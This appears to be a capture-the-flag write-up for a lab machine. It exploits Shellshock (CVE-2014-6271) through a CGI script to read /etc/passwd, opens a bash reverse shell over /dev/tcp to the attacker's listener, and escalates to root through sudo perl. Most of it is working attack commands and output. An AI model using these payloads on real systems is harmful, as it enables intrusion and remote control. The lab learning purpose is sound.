After some fuzzing we found the user.sh cgi script. Trying **[CVE-2014-6271 (Shellshock)](https://nvd.nist.gov/vuln/detail/cve-2014-6271)** we found it vulnerable

```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :''  http://10.10.10.56/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

So we get a reverse shell

```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.5/1234 0>&1' bash -s :''  http://10.10.10.56/cgi-bin/user.sh

------------------

┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nvlp 1234                                                                                                   
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 40698
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
shelly
```

And checking for sudo privileges we found that we can run perl with root permissions

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'  
# whoami
root
```

And we are root